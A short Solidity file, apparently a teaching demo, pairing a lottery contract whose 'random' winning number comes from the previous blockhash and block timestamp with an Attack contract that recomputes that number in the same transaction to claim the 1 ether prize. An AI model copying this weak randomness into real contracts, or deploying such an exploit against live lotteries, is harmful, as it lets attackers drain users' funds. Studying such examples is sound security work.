pragma solidity ^0.6.0;
//test

contract VulnerableLottery{
    constructor() public payable {}
    
    function selectWinner(uint _number) public {
        uint result = uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp)));
        
        if(  _number == result){
            (bool sent,) = msg.sender.call{value: 1 ether} ("");
            require (sent, "Failed");
        }
    }
}

contract Attack {
    fallback() external payable {}
    
    function attack( VulnerableLottery vulnerableLottery) public {
         uint result = uint(keccak256(abi.encodePacked(blockhash(block.number -1), block.timestamp)));
        
        vulnerableLottery.selectWinner(result);
        
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
